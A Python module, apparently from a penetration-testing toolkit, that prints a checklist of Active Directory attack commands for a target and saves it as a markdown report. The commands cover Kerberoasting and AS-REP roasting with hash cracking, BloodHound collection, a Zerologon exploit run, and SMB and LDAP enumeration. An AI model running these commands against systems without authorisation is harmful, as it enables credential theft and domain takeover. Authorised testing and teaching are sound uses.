"""checklist — AD attack reference: kerberoast, asreproast, bloodhound, zerologon, smb"""
from pathlib import Path


CHECKS = {
    "kerberoast": {
        "desc": "Kerberoasting — crack TGS tickets for service accounts",
        "commands": [
            "pip install impacket",
            "GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -request",
            "GetUserSPNs.py DOMAIN/user:password -dc-ip DC_IP -request -outputfile hashes.txt",
            "hashcat -m 13100 hashes.txt wordlist.txt",
            "john --format=krb5tgs hashes.txt",
        ],
    },
    "asreproast": {
        "desc": "AS-REP roasting — accounts without pre-auth",
        "commands": [
            "GetNPUsers.py DOMAIN/ -dc-ip DC_IP -usersfile users.txt -no-pass -format hashcat",
            "GetNPUsers.py DOMAIN/ -dc-ip DC_IP -request -no-pass -outputfile asrep.txt",
            "hashcat -m 18200 asrep.txt wordlist.txt",
        ],
    },
    "bloodhound": {
        "desc": "BloodHound — AD graph collection",
        "commands": [
            "pip install bloodhound",
            "bloodhound-python -u USER -p PASS -d DOMAIN -ns DC_IP -c All",
            "# import into BloodHound GUI",
            "# queries: Shortest Paths to Domain Admins, Kerberoastable Users",
        ],
    },
    "zerologon": {
        "desc": "Zerologon CVE-2020-1472 — Netlogon PrivEsc",
        "commands": [
            "python cve-2020-1472-exploit.py NETBIOS_NAME DC_IP",
            "nmap -p 445 --script smb-vuln-zerologon DC_IP",
        ],
    },
    "smb_enum": {
        "desc": "SMB enumeration",
        "commands": [
            "smbclient -L //TARGET/ -N",
            "enum4linux -U TARGET",
            "enum4linux -S TARGET",
            "nmap -p 445 --script smb-enum-shares,smb-enum-users TARGET",
        ],
    },
    "ldap_enum": {
        "desc": "LDAP anonymous enumeration",
        "commands": [
            "ldapsearch -x -H ldap://TARGET -s base namingContexts",
            "ldapsearch -x -H ldap://TARGET -b 'dc=DOMAIN,dc=com' '(objectClass=user)'",
        ],
    },
}


class Checklist:
    def run(self, session, logger):
        target = session.target
        out = Path("reports/ad_checklist.md")
        out.parent.mkdir(exist_ok=True)

        lines = [f"# AD Attack Checklist — {target}", ""]
        for name, info in CHECKS.items():
            print(f"\n[{name}] {info['desc']}")
            lines.append(f"## {name} — {info['desc']}")
            lines.append("")
            lines.append("```bash")
            for cmd in info["commands"]:
                cmd = cmd.replace("DC_IP", target).replace("TARGET", target)
                print(f"  {cmd}")
                lines.append(cmd)
            lines.append("```")
            lines.append("")

        out.write_text("\n".join(lines))
        print(f"\n[checklist] saved -> {out}")
        logger.finding("ad_checklist", "info", f"AD reference for {target}")
        return {"checks": list(CHECKS.keys()), "file": str(out)}
